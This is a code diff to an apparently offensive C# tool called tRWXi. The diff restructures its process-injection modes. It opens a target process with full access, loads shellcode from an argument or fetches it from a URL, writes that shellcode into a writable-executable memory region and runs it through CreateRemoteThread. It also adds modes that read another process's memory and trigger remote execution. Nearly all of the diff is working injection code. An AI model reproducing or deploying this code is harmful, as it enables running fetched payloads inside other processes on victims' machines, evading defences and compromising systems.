@@ -75,7 +75,7 @@ namespace tRWXi
                                         out returnLength);
 
                                     var lpTokenInfo = (Win32.TOKEN_MANDATORY_LABEL*)LocalAlloc((uint)Win32.LocalMemoryFlags.LMEM_FIXED, returnLength);
-                                    
+
                                     IntPtr p = (IntPtr)lpTokenInfo;
 
                                     GetTokenInformation(
@@ -131,57 +131,69 @@ namespace tRWXi
                         lpAddress = IntPtr.Zero;
                     }
                 }
-                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
+                else if (parameters.ContainsKey("inject"))
                 {
                     if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                     {
                         int pid = Convert.ToInt32(parameters["pid"]);
                         IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
                         IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));
-
-                        if (parameters.ContainsKey("read"))
+                        byte[] data;
+                        if (parameters.ContainsKey("data"))
                         {
-                            int size = Convert.ToInt32(parameters["size"]);
-                            byte[] output = new byte[size];
-                            IntPtr written = new IntPtr();
-                            Win32.ReadProcessMemory(hProcess, addr, output, size, out written);
-                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
-                            Environment.Exit(0);
+                            data = Utils.Shellcoder.convert(parameters["data"]);
                         }
-                        else if (parameters.ContainsKey("inject"))
+                        else if (parameters.ContainsKey("url"))
                         {
-                            byte[] data;
-                            if (parameters.ContainsKey("data"))
-                            {
-                                data = Utils.Shellcoder.convert(parameters["data"]);
-                            }
-                            else if (parameters.ContainsKey("url"))
-                            {
-                                data = Utils.Shellcoder.fetch(parameters["url"]);
-                            }
-                            else
-                            {
-                                data = new byte[] { };
-                            }
-                            Console.WriteLine("[*] Started injection");
-                            Win32.WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
-                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
+                            data = Utils.Shellcoder.fetch(parameters["url"]);
                         }
-                        else {}
-
-                        Console.WriteLine("[*] Starting execution...");
-                        IntPtr res = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-                        if ((int)res != 0)
+                        else
                         {
-                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                            data = new byte[] { };
+                        }
+
+                        Console.WriteLine("[*] Started injection");
+                        Win32.WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
+                        Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
+
+                        if (parameters.ContainsKey("execute"))
+                        {
+                            Console.WriteLine("[*] Starting execution...");
+                            IntPtr res = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+                            if ((int)res != 0)
+                            {
+                                Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                            }
                         }
                         Environment.Exit(0);
                     }
-                    else
+                }
+                else if (parameters.ContainsKey("read"))
+                {
+                    int pid = Convert.ToInt32(parameters["pid"]);
+                    IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
+                    IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));
+
+                    int size = Convert.ToInt32(parameters["size"]);
+                    byte[] output = new byte[size];
+                    IntPtr written = new IntPtr();
+                    Win32.ReadProcessMemory(hProcess, addr, output, size, out written);
+                    Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
+                    Environment.Exit(0);
+                }
+                else if (parameters.ContainsKey("trigger"))
+                {
+                    int pid = Convert.ToInt32(parameters["pid"]);
+                    IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
+                    IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));
+
+                    Console.WriteLine("[*] Starting execution...");
+                    IntPtr res = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+                    if ((int)res != 0)
                     {
-                        Utils.Helper.help();
-                        Environment.Exit(1);
+                        Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                     }
                 }
                 else
@@ -189,7 +201,7 @@ namespace tRWXi
                     Utils.Helper.help();
                     Environment.Exit(1);
                 }
-                
+
                 Win32.CloseHandle(hSnapshot);
 
                 if (parameters.ContainsKey("enumerate"))
